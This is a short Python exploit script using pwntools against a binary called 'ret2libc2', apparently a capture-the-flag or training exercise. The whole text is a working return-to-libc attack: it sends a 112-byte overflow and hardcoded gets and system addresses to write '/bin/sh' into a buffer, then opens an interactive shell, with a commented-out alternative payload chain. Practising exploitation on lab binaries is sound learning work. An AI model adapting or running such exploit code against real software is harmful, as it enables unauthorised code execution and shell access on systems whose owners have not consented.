from pwn import *

elf = ELF('ret2libc2')
io = process(elf.path)
gets_addr = 0x08048460
system_addr = 0x08048490
buf2_addr = 0x0804A080
pop_ebx = 0x0804843d
#gdb.attach(io,"b * 0x080486bf")
#payload = flat(['a' * 112, gets_addr, pop_ebx, buf2_addr, system_addr, 'bbbb', buf2_addr])
payload = flat(['a' * 112, gets_addr, system_addr, buf2_addr, buf2_addr])

io.sendline(payload)
io.sendline('/bin/sh')
io.interactive()
